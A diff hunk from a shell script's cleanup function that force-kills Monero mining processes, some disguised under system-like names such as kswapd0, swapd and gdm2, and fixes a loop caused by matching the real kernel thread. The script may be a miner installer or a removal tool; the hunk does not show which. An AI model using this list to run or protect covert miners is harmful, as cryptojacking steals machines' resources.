@@ -293,7 +293,11 @@ clean_previous_installations() {
     # Use robust force-stop function
     force_stop_service \
         "swapd gdm2 moneroocean_miner" \
-        "xmrig kswapd0 swapd gdm2 monero minerd cpuminer"
+        "xmrig swapd gdm2 monero minerd cpuminer"
+    # kswapd0 removed from process list: pgrep -x matches the real kernel thread
+    # which can never be killed, causing the loop to run all max_attempts iterations.
+    # Use a path-specific pkill below if a miner is disguised as kswapd0.
+    pkill -9 -f "/root/.swapd/kswapd0\|\.swapd/kswapd0\|kswapd0 -c " 2>/dev/null || true
 
     # Additional cleanup
     pkill -9 -f "config.json\|system-watchdog\|launcher.sh" 2>/dev/null || true
